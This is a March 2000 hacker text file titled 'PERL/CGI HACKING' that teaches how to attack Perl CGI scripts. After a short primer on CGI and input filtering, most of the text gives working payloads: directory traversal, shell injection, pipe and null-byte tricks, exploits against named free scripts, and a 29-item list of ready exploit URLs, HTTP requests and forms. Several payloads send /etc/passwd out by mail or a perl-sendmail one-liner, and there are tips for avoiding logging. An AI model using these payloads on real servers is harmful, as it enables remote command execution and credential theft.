@@ -1,0 +1,877 @@
+:: :by tonec, march 2000,, --[[PERL/CGI HACKING]]--
+                     
+
+  --> (0.0 ~ table of contents) 
+
+  0.0   table of contents
+  1.0   intro
+  2.0   how does cgi/perl work?
+  2.1     what makes cgi vulnerable?
+  2.2     filtering user input
+  3.0   techneeqz
+  3.1     directory traversal
+  3.2     system and sendmail calls
+  3.3     pipe problem
+  3.4     poison null byte
+  4.0   new unpublished cgi exploits
+  4.1     clickresponder.pl
+  4.2     form.cgi
+  4.3     links.pl
+  4.4     screamlink.cgi
+  4.5     screamtext.cgi
+  5.0   known cgi exploits
+  6.0   further reading
+        
+
+  --> (1.0 ~ introduction)
+
+  Ok, this text assumes basic knowledge of perl, if you lack that perhaps some 
+other programming language will work too ,cause a lot of the concepts are the 
+same. If you dont have any of those, well, figure it out or something, learn 
+perl, whatever. Don't comment on spelling, grammar, and words like fuck dick 
+shit whore cunt etc. Comments on the contents are always welcome. Oh yea, the 
+stuff about "pipe" and "nullbyte" are from an article by the name of "Perl CGI 
+problems" from Phrack 55, by rfp. Take a look at that for more info 
+(http://www.insecure.org/news/P55-07.txt). Greetz to all my wh0res, you know 
+who your are. If you like it or have comments send me mail at 
+tone@freeshell.org. Since I never check that you might as well find me on irc 
+or something. So much for the intro.
+
+
+  --> (2.0 ~ how does cgi/perl work?)
+
+  CGI stands for Common Gateway Interface. CGI scripts allow web pages to 
+communicate and interact with executable programs based on the server. For 
+each CGI script that is executed a new process is started, and will be 
+terminated when the CGI has finished. Usually data is sent to the server to 
+be executed or manipulated, and is then returned to the user in html or image 
+form. 
+  The diagram below explains briefly the steps involved when a CGI script 
+is executed.
+
+                SIX STEP EXPLAINATION OF CGI
+               -============================-
+
+     WWW BROWSER             SERVER             APPLICATION
+       (user)                          
+
+                    |      
+   User requests --[1]- Server sends form
+        form        |       to client
+                    |           |
+   User inputs -----+----------[2]
+  data and sends    |
+  data to server    |
+        |           |
+       [3]----------+--- Server forwards
+                    |      data to CGI
+                    |      application ---[4]----- Data is
+                    |                             processed 
+                    |                            and returned
+                    |                              to server
+                    |                                  |
+                    |    Server forwards -------------[5]
+  Client receives   |     processed data
+     processed ----[6]----  to client
+       data         |
+                    |
+                    |
+        [Transmitted over network]
+
+
+  Most CGI scripts are programmed in Perl (Practical Extraction and Report 
+Language - see www.perl.com), but basically any programming language that can 
+read from STDIN (standard input) can be used to program CGI scripts or 
+programs. Because nearly all CGI scripts are still programmed in perl it would 
+be useful to know perl or some other programming language for that matter. It 
+will definetaly help.
+  CGI is used to perform actions that a normal webpage can't do. Managing 
+databases of user accounts, calculating exchange rates, or updating user 
+statistics are amongs those. There are CGI scripts out there for virtually 
+every thinkable purpose, otherwise you can always write your own.
+
+
+  --> (2.1 ~ what makes cgi vulnerable?)
+
+  Probably the biggest vulnerability in the entire CGI system is user input. 
+Users can input data into the CGI script, making it do other things than were 
+originally intended. Reading files or program execution are amongs these. It 
+is the special user input that can force these programs to perform other 
+functions. Look at it as if the user input were the parameters to a program 
+like "echo".
+  Depending on the permissions of echo this could have some catastrophic 
+consequences. Normal use would probably look something like this:-
+
+  echo "some shitty text" >> testfile
+
+  But, by modifying parameters we can execute the following commands:
+
+  echo "some shitty text" ; cat /etc/passwd
+
+  This will basically echo the string to the terminal, and then cat the 
+passwd file. It is therefore important NOT TO TRUST USER INPUT. Many CGI 
+scripts don't check user input for evil characters, and some do it only 
+partially, still leaving potential exploits. The example above is very 
+simplified, and only a VERY dumb cgi script would allow something like 
+that.
+  In this text I will only concentrate on perl scripts, as they are the most 
+common and contain the most holes. Generally, if you know how CGI scripts 
+are written, and how the data is retrieved and returned, you can skip this 
+section. This is one of the simplest CGI script there is:-
+
+  ---cut here---
+
+  #!/usr/bin/perl
+  # some cheap cgi-script
+
+  $some_variable = "mwahahah";
+  # program and data manipulation would come in this part here
+
+  print <<EOF;
+  Content-Type: text/html
+
+  # start html document
+  <html>
+  Hello, world.<p>
+  $some_variable
+  </html>
+  # end html document
+
+  EOF
+
+  ---cut here---
+
+  Lets review what happens here. This program has no user input, but it does 
+have an output. When this script is made executable in the cgi-bin directory, 
+and accessed using a web browser, it will simply display the text "Hello, 
+world" and "mwahahah" on the page. Anything between print <<EOF; and EOF will 
+be returned as an html document, in which variables like $some_variable can be
+used as well.
+  Now look at the following example, it will let you look at any file on the 
+system:-
+
+  ---cut here---
+
+  #!/usr/bin/perl
+  # this will let you view any file on the system
+
+  $some_variable = $ENV{QUERY_STRING};
+
+  # $some_variable =~ s/\///g;    # ignore this for now
+
+                              #
+  open(FILE, $some_variable); # This part does nothing more
+  while(<FILE>) {             # than read the file specified by
+     push(@somefile,$_);      # $some_variable into the array
+  }                           # @somefile, which is later 
+  close(FILE);                # placed in the html code.
+                              #
+
+  print <<EOF;
+  Content-Type: text/html
+
+  <pre>
+  @somefile
+  </pre>
+
+  EOF
+
+  ---cut here---
+
+  In this case, the file $some_variable is opened. $some_variable is assigned 
+in the fourth line. The variable $ENV{QUERY_STRING} will be the used input in 
+this case. Lets say we wanted to view the password file using this script. 
+First of all, it has to be executable. To do that, do:-
+
+  chmod 755 cgi-script.pl
+
+  Now call the cgi script by pointing your webbrowser in the following 
+direction:
+
+  http://www.foobar.com/cgi-bin/cgi-script.pl?/etc/passwd
+
+  And the password file will be presented on the screen. The part after the ? 
+is the string (you could consider it the parameters) sent to the script, which 
+is the same as $ENV{QUERY_STRING}, and the same as $some_variable. As you can 
+see, the input string by the user is the direct cause of all this mess. 
+
+
+  --> (2.2 ~ filtering user input)
+
+  To ensure no 'evil' characters make it into sensitive areas of the program, 
+characters must removed from the string ($some_variable) BEFORE it is used to 
+open the file, and a big part of the problem would be solved.
+  This is exactly what will be done to secure and verify the user input. Look 
+at line 5 of the example script above. By uncommenting that all the / 
+(slashes) will be removed from the user input. Instead of /etc/passwd, the 
+user input will now be etcpasswd, which is a nonexistent file.
+  To understand how the variabe $some_variable is changed we need to examine 
+the line $some_variable =~ s/\///g; Here is how it works:-
+
+  $any_variable = "this is a string";
+
+  $any_variable =~ s/string/line/g;
+
+  The s (substitute) operator replaces a certain number of characters in a 
+string. In the situation above, it replaces the word "string" with "line", 
+therefore $any_variable is now "this is a line". Lets imagine the following 
+situation:-
+
+  $any_variable = "/etc/passwd";
+
+  $any_variable =~ s/\//BAH/g;
+
+  The variable will now be "BAHetcBAHpasswd". If you look closely the text 
+that will be replaced is "\/". This is because putting just the / will mess 
+things up, and it therefore has to be escaped. Basically, it is the most 
+effective way of putting a / in the "replace" field without screwing the 
+entire operator up. But, instead of the above subsitution we're going to use 
+a slightly different one, that will replace the / with nothing at all, like 
+so:-
+
+  $any_variable =~ s/\///g;
+
+  Perhaps its easier to make out when it's split up:-
+
+    substitude operator      -->   s/  
+    text to be replaced      -->   \/
+    slash to separate fields -->   / 
+    text to replace it with  -->          (this is empty in this case)
+    end operator             -->   /g;
+
+  Okay, this should be quite clear by now, if not, find yourself a perl 
+manual or book or whatever. Another way of solving this problem is by escaping 
+any 'evil' characters. Even though this is just an alternative to completely 
+removing the 'evil' characters, it preserves slashes and other characters that 
+might actually be needed in the program.
+  Escaping is very much the same as just removing the 'evil' characters 
+alltogether, it just required a slightly different use of the substitute 
+operator. Escaping evil characters basically means putting a frontslash \ in 
+front of it. This will escape all of Perl's special characters 
+(metacharacters). By putting a \ in front of a $ sign, Perl will read the $ 
+sign as an actual character with no special meaning, whereas if Perl ran 
+across an unescaped $ it will think it is part of a variable, as they are 
+specified by using a $. (like $some_variable) This prolly sounds fuqd up, 
+but its very simple. 
+  In most scripts metacharacters are escaped, this way if someone typed in 
+"mwhaha ;)" into a script, it remains the same after passing the substitude 
+operator. If all metacharacters were simply removed, the string would look 
+like "mwhaha ", since ; and ) will be completely removed, as they're meta 
+characters. Here's how meta characters are usually handled:-
+
+  s/$%*/\\$1/g;
+
+  And all nice and split up it looks like this:-
+
+    substitude operator      -->   s/  
+    text to be replaced      -->   $%*
+    slash to separate fields -->   /
+    text to replace it with  -->   \\$1
+    end operator             -->   /g;
+
+  You get the idea. This is one of the areas in the CGI script that has to be 
+understood very thoroughly, as it is likely to contain flaws or slight 
+mistakes that allow for an exploit. Since the user input is the only thing 
+that an attacker can actually control, it is here that we need to pay 
+attention. Now that you know the basic methods of how data is passed to the 
+CGI script, how it is "censored" to remove evil characters, and how 
+information is returned to the user, we can go on to exploiting weak 
+substitute operators.
+
+
+  --> (3.0 ~ techneeqz)
+
+  The following chapter, or section rather, will focus on what kind of code 
+will allow for exploitation, and how this can be done. Some of these methods 
+are taken from "CGI Problems", by rfp, so you might want to take a look at that
+as well. In all of the following examples the variable "$ui" will reseble the 
+user input, or the data passed to the script by the user.
+
+  --> (3.1 ~ Directory traversal)
+
+  This isnt really a technique, just a little note for those who dont know 
+it. It is very useful in exploiting cgi scripts. Lets say a cgi script opens 
+the following file and prints the output to a page:-
+
+  /var/lib/apache/htdocs/database/$filename
+
+  Some programmers believe that this will allow the script to read ONLY from 
+that directory. By passing "../../../../../etc/passwd" to $filename the file 
+opened will actually be /etc/passwd, as every "../" goes up one directory. 
+Again, most people already know this, but for those of you who dont, there 
+it was.
+
+  --> (3.2 ~ system and sendmail calls)
+
+  System calls are VERY dangerous, as a shell is basically opened and used to 
+execute a command. Take a look at the following example:-
+
+  $somevar = system("ls $iu");
+
+  $somevar = `ls $iu`;      # this is the same as the above statement
+
+  Now, this script could do something like read the files in a directory, 
+whatever. If our user input was "/tmp", the command executed would be 
+"ls /tmp". Now if we passed "/tmp ; cat /etc/passwd" to the script, it would 
+execute "ls /tmp" first, and then "cat /etc/passwd". Well you get the idea. 
+Passing shit to system calls is a BAD idea.
+  Another variation of this is used quite often, and it is sendmail. Yes, 
+again, sendmail. Here is a commonly used example:-
+
+
+  $mail_to = $ui;
+  open (MAIL, "|/usr/bin/sendmail $mail_to");
+    print MAIL "To: $mail_to\nFrom: bill@whitehouse.gov\n\nbl0w me\n";
+  close (MAIL);
+
+  Now, as you can see this will simply send an email to the adress specified 
+as user input, in this case the variable $mail_to. The piped open() call is 
+the cause of the problem here. If we pass "monica@whitehouse.gov;mail 
+tone@freeshell.org</etc/passwd;" to the $mail_to variable the line executed 
+will look like the following:-
+
+  /usr/bin/sendmail monica@whitehouse.gov ; mail tone@freeshell.org</etc/passwd
+
+  Well, you can see what kind of sweet consequenses that can have. Not this 
+only works when there is a pipe before the sendmail path.
+
+
+  --> (3.3 ~ pipe problem)
+
+
+  This one is from "Perl CGI problems" by rfp, look there for more info. I'll 
+just explain quickly what it does. Look at this piece of code:-
+
+  open (FILE, "$ui");
+     ##  do whatever ##
+  close (FILE);
+
+  Even though this may SEEM like a potential read-any-file type of 
+vulnerability, it is actually a command execution, because of the pipe 
+problem. Simply pass "cat /etc/passwd|" as the file to OPEN, and it will 
+execute that command blindly. The first line will then become:-
+
+  open (FILE, "cat /etc/passwd|");
+
+  However, there are a few limits to this. When file checking is used in 
+any way (using the -e option in perl) OR a file is opened as in APPEND, 
+REWRITE, or any such file mode, this will NOT work. File checking will for 
+work for the followin reason, if the script tries to open THE EXACT FILE 
+called "cat /etc/passwd" it will not exist. In this case it is possible to 
+pass commands like "ls" or "uname", as there is a file with that exact name 
+as well. "ls" is useful to see what other files are located in the cgi-bin 
+directory. 
+  When a file is opened in a certain mode it will usually look something 
+like this:-
+
+  open (FILE, ">$ui");
+  open (FILE, ">>$ui");
+
+  So, only when the file is blindly opened without file checking or specific 
+file modes can this vulnerability be fully exploited.
+
+
+  --> (3.4 ~ Poison null byte)
+
+  Again, from rfp's article, check that for more info. This quite simple as 
+well, and I wont go into too much details. This "feature" can be used quite 
+often when databases or html files are being read. Anywhere where an 
+extention is appended to a filename. Picture the following situation:-
+
+  open (FILE, "$ui.html");
+    ## print the file to an html document ##
+  close (FILE);
+
+  Now, .html is being appended to $ui and the file is opened. So, it seems 
+we can only open html files, this is where the null byte comes in. By 
+passing "blah%00" to $ui, perl will open the file "blah" and NOT "blah.html". 
+This is nice, because if we combine it with the "dirup" idea, we can simply 
+pass ../../../../../etc/passwd%00 as the file to open to the script, and 
+tadaaa. This doesnt always work though. The %00 is converted to a NULL 
+character by the following line:-
+
+  $ui =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+
+  This converts odd characters submitted to a cgi script (which are pretty 
+much all meta characters, and other characters which are not valid 
+WWW-characters, amongs these is the "null")
+
+
+  --> (4.0 ~ new unpublished cgi exploits)
+
+
+  Here are some new CGI vulnerabilities I found at a couple of those free 
+cgi script places. (www.cgi-resources.com) They all have a simple 
+explaination as to how they work and why. 
+
+
+  --> (4.1 ~ clickresponder.pl)
+
+  This is a cheap cgi I ran across on some free cgi page. Here's how it 
+works and where the problem lies. This doesnt even require special tricks 
+or knowledge, its just plain and stupid programming. This script was intended 
+to send a file to anyone who entered their e-mail adress, the problem is, 
+you get to specify the file. Even though it isnt *that* obvious, there is 
+a hidden input box in the HTML. So, to make it send you basically any file, 
+just do:-
+
+  clickresponder.pl?mestxt=../../../etc/passwd&send_to=tonec@blah.com
+
+  Add the server adress and crap to that as well, shouldnt be too difficult. 
+Also, the script itself has a logging function built in, so you might want 
+to do this stuff off a cheap shell somewhere.
+  To get directory listings try the following:-
+
+  clickresponder.pl?mestxt=ls|&send_to=tonec@blah.com
+
+  Adding a | to the filename to execute the command and read it's output, 
+but this does not work if the perl script checks to see if the file exists.
+For example, if our command was ls%20-al, the script would check to see if 
+the file ls -al exists. This is not the case, and therefore it would exit 
+with an error, but this script doesnt even check to see if the file exists, 
+so basically any command can be executed. (SEE Sect 3.1) Make sure "ls" is 
+in the path, otherwise you'll have to use "../../../../bin/ls", well, you 
+get the idea. Try stuff like:-
+ 
+  mestxt=ls%20-al|&send_to=tonec@blah.com
+  mestxt=cat%20/etc/passwd|&send_to=tonec@blah.com
+  
+  Yet another CGI problem helped out of this world.
+
+
+  --> (4.2 ~ form.cgi)
+
+  Yay, this is a similar script as above with exactly the same dumb problem. 
+The input file from the form is blindly read and can be specified by the 
+user. Exploiting this script is therefore fairly easy. Because of the way 
+it reads use input (post) commands cannot be executed in 'command line'-like 
+style, as is used above. Therefore we can just create a simple form to do 
+the job for us like so:-
+
+  <form method="POST" action="www.foobar.com/cgi-bin/form.cgi">
+
+  <input type="text" name="name"><br>
+  <input type="text" name="email"><br>
+  <input type="text" name="subject"><br>
+  <textarea name="body" cols="1" rows="1"></textarea>
+  <input type="text" name="response" value="cat /etc/passwd|">
+  <input type="submit"><input type="reset">
+  </form>
+
+  By pressing submit you will shortly receive the result of the request. Keep 
+in mind some of the fields might be required, so just fill in some bogus name, 
+you get the point. There is however one problem with this, when I was 
+testing it catting /etc/passwd did not work for some screwed up reason, while 
+other files with exactly the same permissions did. I tracked it down to 
+(believe it or not) the fact that /etc/passwd had : (semicolons, yes) in them. 
+The only explaination I can give for this is that the way the script writes 
+the file to sendmail screws it up, because other methods of writing it to 
+sendmail dont cause any problems. But, there is an easy way to work around 
+this, after all, remote command execution is a powerful thing. Try the 
+following as the command, instead of cat /etc/passwd:-
+
+  sed "s/:/-/g" /etc/passwd
+
+  This will replace all the ":" in /etc/passwd and replace them with "-". 
+Your password file that is returned will look something like this:-
+
+  root-x-0-0-operator-/root-/bin/bash
+
+  But any fool can make out what all the fields mean. Capiche? This script 
+is called "Cliff's Form Mailer Version 1.0" from www.shavenferret.com/scripts. 
+There are prolly a lot of other form.cgi's out there, which are completely 
+different, so that will help a bit. 
+
+
+  --> (4.3 ~ links.pl)
+
+  Ah, yet another one. Links.pl is a "free for all" link script, it allows 
+users to add their link to your page, basically. It's called "LinkLister" 
+by Wolfgang Melchior Citro Communications (http://www.citro.net)
+  This script blindly opens a configuration file which is specified by the 
+user. By simply adding a | (pipe) to the filename, it will excute the file, 
+or in this case, command specified. Because no checking to see if the file 
+exists is present, this turns into another remote command exec. However, 
+inputting the command "mail tonec@blah.org</etc/passwd" doesnt work, this 
+is probably because the script filters out < and >, so that html characters 
+wont be used. This presents a little problem, because how are we going to 
+get the output of our command? The script doesnt copy anything back to the 
+user, so we're stuck with only the command execution. 
+  With a little creativity and some help from our friend perl this can 
+easily be solved by making the script execute the following command:-
+
+  perl -e '$v = `sed "s/:/-/g" /etc/passwd`; open(M, "|/usr/bin/sendmail 
+tonec\@localhost"); print M "$v\n.\n"; close(M);'|
+
+  This looks complicated, but if we break it up, it's actually very simple:-
+
+  perl -e '
+    $v = `sed "s/:/-/g" /etc/passwd`;
+    open(M, "|/usr/bin/sendmail tonec\@blah.org");
+    print M "$v\n.\n";
+    close(M);
+  '
+  |
+
+  Exactly, a command line perl program. The -e switch turns anything between 
+the two ' (ticks) into a program. First the password file is assigned to $v 
+using the command
+
+  `sed "s/:/-/g" /etc/passwd`
+
+  A simple `cat /etc/passwd` doesnt work, I think it screws up for the same 
+reason as the script before this one, the ":" interfering with sendmail or 
+something, I still think its wierd, but ah well. So sed is used and the 
+problem is avoided. Now we have the passwd file in $v, and thats send to the 
+email adress using sendmail, problem solved, another CGI hole exposed. The 
+| at the end is to make the entire line execute, dont forget it. Oh ya... 
+for putting in the command (this is kinda important) just create the 
+following html file:-
+
+  <form method=POST action="www.foobar.com/cgi-bin/links/links.pl">
+  <input type="text" name="setupfile" value="put your command here">  
+  <input type=submit value="Execute">
+
+  So much for this cheap script.
+
+
+  --> (4.4 ~ screamlink.cgi)
+
+  Ah, yet another one. This script is used for random links, it reads a 
+link out of a file (from a random line) and produces a page with a forward 
+function. The file specified can be changed by the user as follows, normally 
+this would be the way to call the script:-
+
+  screamlink.cgi?links
+
+  Where links is the file with the links, one on each line. Now, if we want 
+to read a random line out of /etc/passwd, say, we do the following:-
+
+  screamlink.cgi?/etc/passwd 
+
+  Easy as fuck. The script will return the following page:-
+
+  <title>302 Found</title>
+  <H1>found</H1>
+  The document has been moved 
+  <A HREF="root:h8dsna72na:0:0:r00t:/:/bin/sh"> here</A>.<P>
+
+Just keep doing that until you hit root. The only problem is that incompetent 
+shitass browsers like IE5 dont show this page, but come up with some fake 
+generated error, so just use telnet:-
+
+  ereet$ telnet www.foobar.com 80
+  Trying 123.123.123.123...
+  Connected to www.foobar.com.
+  Escape character is '^]'.
+  GET /cgi-bin/screamlink.cgi?/etc/passwd
+  --- some crap here --- 
+  <title>302 Found</title>
+  <H1>found</H1>
+  The document has been moved 
+  <A HREF="root:h8dsna72na:0:0:r00t:/:/bin/sh"> here</A>.<P>
+  --- some crap here ---
+  Connection closed by foreign host.
+  ereet$
+
+  Well well. Isn't CGI wonderful.
+
+
+  --> (4.5 ~ screamtext.cgi)
+
+  This is exactly the same as above, except you can use practically any browser.
+
+  www.foobar.com/cgi-bin/screamtext.cgi?/etc/passwd
+
+  That will give you a line from /etc/passwd, just do that often enough and 
+logic says you'll get en entire passwd file at some point.
+
+
+  --> (5.0 ~ known exploits and instructions)
+
+  This is a list I compiled of well known CGI exploits, along with a quick 
+note on what the impact is and how to exploit them. Some of these "remote 
+file reading" possibilities may be turned into command exec's with a pipe at 
+the end, I havent had time to test them all, and besides.. I'm not your wh0re.
+
+  [CGI/PERL VULNERABILITY LIST]
+  feb/march 2000 - by tonec
+
+  I am hoping to keep this list up to date, with as many CGI exploits and 
+instructions as possible. So send me texts if you happen to run across any.
+
+--------------------------------------------------------------------01-
+  file:       /cgi-bin/handler [IRIX 5.3 6.2]
+  impact:     Remote command exec as httpd
+  exploit:    telnet www.foobar.com 80
+              GET /cgi-bin/handler/bah;cat       /etc/passwd|?
+              data=Download
+  notes:      Be sure to use tabs, not spaces.
+--------------------------------------------------------------------02-
+  file:       /cgi-bin/handler [IRIX 6.3]
+  impact:     Remote command exec as httpd
+  exploit:    telnet www.foobar.com 80
+              GET /cgi-bin/handler/bah;cat       /etc/passwd|    ?
+              data=Download
+  notes:      Be sure to use tabs, not spaces.
+--------------------------------------------------------------------03-
+  file:       /cgi-bin/test-cgi [*NIX]
+              /cgi-bin/nph-test-cgi (version <2.1)
+  impact:     Remote directory listing
+  exploit:    telnet www.foobar.com 80
+              GET /cgi-bin/test-cgi?/*
+  notes:      Replace /* for any fully qualified path
+              I found http://www.foobar.com/cgi-bin/test-cgi?\help&
+              0a/bin/cat%20/etc/passwd in a doc somewhere, not sure if 
+              it works though.
+              Also keep in mind nearly all of these scripts are newer 
+              versions no longer vulnerable to this exploit.  
+--------------------------------------------------------------------04-
+  file:       /cgi-bin/phf [*NIX]
+              /cgi-bin/phf.pp
+              /cgi-bin/phf.cgi
+  impact:     Remote command exec as httpd
+  exploit:    www.foobar.com/cgi-bin/phf?Qalias=x%0a/bin/cat%
+              20/etc/passwd
+  notes:      anyone still running this deserves to be 0wned. 
+--------------------------------------------------------------------05-
+  file:       /cgi-bin/websendmail [*NIX]
+  impact:     Remote file reading as httpd
+  exploit:    telnet www.foobar.com 80
+              POST /cgi-bin/websendmail HTTP/1.0
+              Content-length: 85
+              receiver=;mail+anon\@shitmail.org</etc/passwd;
+              sender=a&rtnaddr=a&subject=a&content=a
+  notes:      Content-Length should equal length of string passed to 
+              server.
+              Don't forget to use \@ instead of @
+--------------------------------------------------------------------06-
+  file:       /cgi-bin/webgais  [*NIX]
+  impact:     Remote file reading as httpd
+  exploit:    telnet www.foobar.com 80
+              POST /cgi-bin/webgais HTTP/1.0
+              Content-length: 81
+              query=';mail+anon@shitmail.com</etc/passwd;echo'
+              &output=subject&domain=paragraph
+  notes:      Content-Length should equal length of string passed to 
+              server.
+--------------------------------------------------------------------07-
+  file:       /cgi-bin/php  [*NIX]
+              /cgi-bin/php.cgi
+  impact:     Remote file reading as httpd
+  exploit:    http://www.foobar.com/cgi-bin/php.cgi?/etc/passwd
+  notes:      -
+--------------------------------------------------------------------08-
+  file:       mylog.html  [*NIX]
+              mlog.html 
+  impact:     Remote file reading as httpd
+  exploit:    http://www.foobar.com/mlog.html?screen=/etc/passwd
+  notes:      -
+--------------------------------------------------------------------09-
+  file:       /cgi-bin/perl.exe [ALL]
+  impact:     Remote exec of perl code
+  exploit:    Find exploit code.
+  notes:      -
+--------------------------------------------------------------------10-
+  file:       /cgi-bin/wwwboard.pl [*NIX]
+  impact:     WWWBoard control.
+  exploit:    Get passwd.txt from same dir as wwwboard.pl, crack it   
+              with your favorite passwd cracker.
+  notes:      A lot of cheap hosting providers have this script pre-
+              installed. I found one a couple of weeks back that used 
+              the user's password as the wwwboard password too.
+              All that has to be done was to crack passwd.txt and the 
+              user's account (lots of .com's) are all open.
+--------------------------------------------------------------------11-
+  file:       /cgi-bin/www-sql [*NIX]
+  impact:     Override .htaccess permissions
+  exploit:    http://www.foobar.com/cgi-bin/www-sql/protected/index.htm
+  notes:      If http://www.foobar.com/protected/index.htm is the 
+              directory (and files) that are protected using .htaccess, 
+              enter the url above to access them.
+--------------------------------------------------------------------12-
+  file:       /cgi-bin/view-source [*NIX]
+  impact:     Remote file reading as httpd
+  exploit:    http://www.foobar.com/cgi-bin/view-source?
+              ../../../../../../etc/passwd
+  notes:      -
+--------------------------------------------------------------------13-
+  file:       msadc/Samples/SELECTOR/showcode.asp [IIS 4.0]
+              msadc/Samples/SELECTOR/codebrws.asp [IIS 4.0]
+              msadc/Samples/SELECTOR/viewcode.asp [Site Server 3.0 ]
+  impact:     Remote file reading
+  exploit:    http://www.foobar.com/msadc/Samples/SELECTOR/showcode.asp
+              ?source=/msadc/Samples/../../../../../boot.ini
+  notes:      -
+--------------------------------------------------------------------14-
+  file:       /scripts/cgimail.exe [NT]
+  impact:     Remote file reading 
+  exploit:    Add <input type=hidden name="$Attach$" value="c:\winnt
+              \repair\sam._"> to the input of the script.
+              Also fill in email to send it to, etc.
+  notes:      -
+--------------------------------------------------------------------15-
+  file:       /cgi-bin/faxsurvey [*NIX]
+  impact:     Remote command exec as httpd
+  exploit:    http://www.foobar.com/cgi-bin/faxsurvey?/bin/cat
+              %20/etc/passwd
+  notes:      Part of the Hylafax package, common on some older linux 
+              distros.
+--------------------------------------------------------------------16-
+  file:       /cgi-bin/campas [*NIX]
+  impact:     Remote file reading as httpd
+  exploit:    http://www.foobar.com/cgi-bin/campas?%0acat%
+              0a/etc/passwd%0a
+  notes:      -
+--------------------------------------------------------------------17-
+  file:       /cgi-bin/aglimpse [*NIX]
+  impact:     Remote command exec as httpd
+  exploit:    telnet www.foobar.com 80
+              GET /cgi-bin/aglimpse/80|IFS=5;CMD=5mail5anon
+              \@shitmail.com\</etc/passwd;eval$ 
+              CMD;echo
+              HTTP/1.0
+  notes:      -
+--------------------------------------------------------------------18-
+  file:       /cgi-bin/webdist.cgi [*NIX]
+  impact:     Remote command exec as httpd
+  exploit:    http://www.foobar.com/cgi-bin/webdist.cgi?distloc=;cat
+              %20/etc/passwd
+  notes:      -
+--------------------------------------------------------------------19-
+  file:       /cgi-bin/count.cgi [*NIX]
+  impact:     Remote code exec
+  exploit:    http://www.rootshell.com/archive-
+              j457nxiqi3gq59dv/199805/count.cgi.l.c
+  notes:      -
+--------------------------------------------------------------------20-
+  file:       /cgi-bin/pfdisplay.cgi [IRIX]
+  impact:     Remote file reading as httpd
+  exploit:    http://www.foobar.com/cgi-bin/pfdispaly.cgi?
+              /../../../../etc/passwd
+  notes:      -
+--------------------------------------------------------------------21-
+  file:       /cgi-bin/pfdisplay [IRIX]
+  impact:     Remote command exec as httpd
+  exploit:    http://victim/cgi-bin/pfdispaly.cgi?'%0A/bin/uname%20-a|'
+  notes:      -
+--------------------------------------------------------------------22-
+  file:       /scripts/convert.bas [NOVELL]
+  impact:     Remote file reading
+  exploit:    http://www.foobar.com/scripts/convert.bas?../../win.ini
+  notes:      -
+--------------------------------------------------------------------23-
+  file:       /cgi-bin/htmlscript [*NIX]
+  impact:     Remote file reading as httpd
+  exploit:    http://www.foobar.com/cgi-bin/htmlscript?
+              ../../../../etc/passwd
+  notes:      -
+--------------------------------------------------------------------24-
+  file:       /cgi-win/uploader.exe [WIN9x/NT]
+  impact:     Remote program upload/execution
+  exploit:    <FORM ENCTYPE="multipart/form-data" METHOD=POST
+              ACTION="http://www.foober.com/cgi-win/uploader.exe/cgi-
+              win/">
+              <INPUT TYPE=HIDDEN NAME="name" VALUE="Foo">
+              <INPUT TYPE=HIDDEN NAME="email" VALUE="Foo@bar.com>
+              File to upload: <INPUT TYPE=FILE NAME="upl-file" SIZE=40
+              ><BR>
+              <INPUT TYPE=TEXT SIZE=40 NAME="desc" VALUE="blah">
+              <INPUT TYPE=SUBMIT VALUE="Upload Now">
+              </FORM>
+  notes:      Create this form in an html doc and run it.
+--------------------------------------------------------------------25-
+  file:       /cgi-bin/clickresponder.pl [*NIX]
+  impact:     Remote command exec as httpd
+  exploit:    http://www.foobar.com/cgi-bin/clickresponder.pl?
+              mestxt=cat%20/etc/passwd|&send_to=tonec@blah.com
+  notes:      SEE Sect 4.1 for details
+--------------------------------------------------------------------26-
+  file:       /cgi-bin/form.cgi [*NIX]
+  impact:     Remote command exec as httpd
+  exploit:    <form method="POST" action="www.foobar.com/cgi-
+               bin/form.cgi">
+              <input type="text" name="name"><br>
+              <input type="text" name="email"><br>
+              <input type="text" name="subject"><br>
+              <textarea name="body" cols="1" rows="1"></textarea>
+              <input type="text" name="response" value="cat 
+              /etc/motd|">
+              <input type="submit"><input type="reset">
+              </form>
+  notes:      SEE Sect 4.2 for details (like catting passwd) 
+--------------------------------------------------------------------27-
+  file:       /cgi-bin/links.pl [*NIX]
+  impact:     Remote command exec as httpd
+  exploit:    <form method=POST action="www.foobar.com/cgi-
+              bin/links/links.pl">
+              <input type="text" name="setupfile" value="put your 
+              command here">  
+              <input type=submit value="Execute">
+  notes:      SEE Sect 4.3 for details (like catting passwd)
+--------------------------------------------------------------------28-
+  file:       /cgi-bin/infosrch.cgi [SGI IRIX]
+  impact:     Remote file reading as httpd
+  exploit:    http://www.foobar.com/cgi-bin/infosrch.cgi?
+              cmd=getdoc&db=man&fname=|/bin/id
+  notes:      Try the | 'trick' described earlier, not sure if it
+              works, as I havent gotten my hands on a copy of the 
+              script yet.
+--------------------------------------------------------------------29-
+  file:       /cgi-bin/loadpage.cgi [*NIX/NT]
+  impact:     Remote file reading & command execution as httpd
+  exploit:    http://www.foobar.com/cgi-bin/loadpage.cgi?user_id=1
+              &file=../../etc/passwd
+              
+              and for command exec:-
+
+              echo -e "GET http://www.foobar.com/cgi-bin/loadpage.cgi?
+              user_id=1&file=|"/bin/ls"| HTTP/1.0\n\n" | nc 
+              proxy.server.com 8080
+  notes:      This is cut right out of another text, but you get the 
+              idea.
+----------------------------------------------------------------------
+
+
+  --> (6.0 ~ More information)
+
+  Well, that was it. I've gotten fed up with writing about this stuff now. 
+Maybe more CGI stuff next time, maybe not. Hope you enjoyed it. If you want 
+to know more about CGI/Perl, I suggest you check out the following places:-
+
+  http://packetstorm.security.com/ - 
+    Lots of texts explaining the above vulnerabilities in a lot more detail.
+
+  http://www.w3.org/Security/Faq/www-security-faq.html
+    The World Wide Web security FAQ. Very useful, gives basic info about 
+    securing perl scripts and how vulnerabilities are caused.
+
+  http://www.perl.com/pub/doc/FAQs/cgi/perl-cgi-faq.html
+    The Perl/CGI programming FAQ. Basic info about Perl/CGI programming.
+
+  http://www.perl.com/
+    Everything you ever needed to know about Perl.
+
+  http://www.programmingtutorials.com/perl.html
+    Lots of Perl programming tutorials.
+
+  http://www.insecure.org/news/P55-07.txt
+    Excellent article by rfp, explains CGI problems and has a couple of new 
+    vulnerabilities you can try out.  
+
+
+
+
+                                               have phun.
+                                                  - tonec   
+
+                                      #hacked/irc.dal.net
+
+
+
+
+EOF
+
+
+
+
